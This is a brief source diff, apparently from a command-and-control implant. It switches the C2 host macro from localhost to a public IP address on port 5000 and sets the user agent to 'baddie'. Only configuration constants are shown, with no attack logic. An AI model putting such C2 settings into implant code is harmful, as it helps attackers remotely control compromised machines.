@@ -1,8 +1,8 @@
 
 
-#define C2_HOST L"localhost"
+#define C2_HOST L"18.219.62.29"
 #define C2_PORT 5000
-#define C2_UA L"speedrun"
+#define C2_UA L"baddie"
 
 #define POST_VERB L"POST"
 #define GET_VERB L"GET"
